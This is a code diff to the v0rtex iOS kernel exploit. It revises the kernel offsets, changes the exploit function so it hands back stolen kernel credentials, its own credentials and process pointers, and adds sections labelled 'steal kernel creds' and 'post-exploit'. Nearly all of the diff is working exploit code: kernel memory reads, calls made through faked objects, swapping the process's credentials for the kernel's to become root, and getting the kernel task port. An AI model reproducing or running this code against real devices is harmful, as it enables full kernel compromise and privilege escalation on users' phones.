@@ -51,7 +51,6 @@
 #import "v0rtex.h"
 
 
-uint64_t OFFSET_base                               = 0xfffffff007004000;
 uint64_t OFFSET_sizeof_task                        = 0x550;
 uint64_t OFFSET_task_itk_registered                = 0x2e8;
 uint64_t OFFSET_task_bsd_info                      = 0x360;
@@ -61,6 +60,8 @@ uint64_t OFFSET_ipc_space_is_task                  = 0x28;
 uint64_t OFFSET_realhost_special                   = 0x10;
 uint64_t OFFSET_vtab_get_retain_count              = 0x3;
 uint64_t OFFSET_vtab_get_external_trap_for_index   = 0xb7;
+
+uint64_t OFFSET_proc_csflags                       = 0x2a8;
 
 
 // ********** ********** ********** constants ********** ********** **********
@@ -541,16 +542,13 @@ typedef union
 
 
 
-
-// ********** ********** ********** exploit ********** ********** **********
-// ********** ********** ********** exploit ********** ********** **********
-// ********** ********** ********** exploit ********** ********** **********
-// ********** ********** ********** exploit ********** ********** **********
-// ********** ********** ********** exploit ********** ********** **********
+#pragma mark - v0rtex()
 
 
+// ********** ********** ********** exploit ********** ********** **********
+// ********** ********** ********** exploit ********** ********** **********
 
-kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred)
+kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, uint64_t *kerncred, uint64_t *selfcred, uint64_t *selfproc)
 {
     kern_return_t retval = KERN_FAILURE,
     ret = 0;
@@ -1079,7 +1077,7 @@ goto out; \
     }
     LOG("Kernel base: " ADDR, kbase);
     
-#define OFF(name) (OFFSET_##name + (kbase - OFFSET_base))
+#define OFF(name) (OFFSET_##name + (kbase - OFFSET_BASE))
     
     kptr_t zone_map_addr = 0;
     KREAD(OFF(ZONE_MAP), &zone_map_addr, sizeof(zone_map_addr));
@@ -1255,6 +1253,9 @@ fakeobj_buf->a.indirect[2] = (addr), \
         goto out;
     }
     
+    
+#pragma mark - steal kernel creds
+    
     kptr_t kern_ucred = 0;
     r = KCALL(OFF(COPYOUT), kernproc_addr + OFFSET_proc_ucred, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
     LOG("kern_ucred: " ADDR ", %s, %s", kern_ucred, errstr(r), mach_error_string(r));
@@ -1262,6 +1263,8 @@ fakeobj_buf->a.indirect[2] = (addr), \
     {
         goto out;
     }
+    *kerncred = kern_ucred;
+    
     
     kptr_t self_proc = 0;
     r = KCALL(OFF(COPYOUT), self_task + OFFSET_task_bsd_info, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
@@ -1270,6 +1273,8 @@ fakeobj_buf->a.indirect[2] = (addr), \
     {
         goto out;
     }
+    *selfproc = self_proc;
+    
     
     kptr_t self_ucred = 0;
     r = KCALL(OFF(COPYOUT), self_proc + OFFSET_proc_ucred, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
@@ -1278,6 +1283,8 @@ fakeobj_buf->a.indirect[2] = (addr), \
     {
         goto out;
     }
+    *selfcred = self_ucred;
+    
     
     int olduid = getuid();
     LOG("uid: %u", olduid);
@@ -1291,7 +1298,8 @@ fakeobj_buf->a.indirect[2] = (addr), \
     }
     // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
     LOG("stole the kernel's credentials");
-    setuid(0); // update host port
+    kern_return_t err = setuid(0); // update host port
+    LOG("setuid(0) %s", mach_error_string(err));
     
     int newuid = getuid();
     LOG("uid: %u", newuid);
@@ -1301,6 +1309,10 @@ fakeobj_buf->a.indirect[2] = (addr), \
         KCALL_ZERO(OFF(CHGPROCCNT), newuid, 1, 0);
         KCALL_ZERO(OFF(CHGPROCCNT), olduid, -1, 0);
     }
+    
+    
+#pragma mark -
+    
     
     host_t realhost = mach_host_self();
     LOG("realhost: %x (host: %x)", realhost, host);
@@ -1441,6 +1453,8 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
         goto out;
     }
     
+#pragma mark - post-exploit
+    
 //    if (callback) {
 //        ret = callback(kernel_task, kbase, cb_data);
 //        if (ret != KERN_SUCCESS) {
@@ -1450,13 +1464,20 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
 //    }
     
     
+    // Stuff needed for post-exploitation duties...
+    
     *tfp0 = kernel_task;
     *kslide = slide;
-    *kernucred = kern_ucred;
+    //*kerncred = kern_ucred;
+    //*selfcred = self_ucred;
+    //*selfproc = self_proc;
+
     
     retval = KERN_SUCCESS;
     
     
+#pragma mark - cleanup
+
     out:;
     LOG("Cleaning up...");
     usleep(100000); // Allow logs to propagate
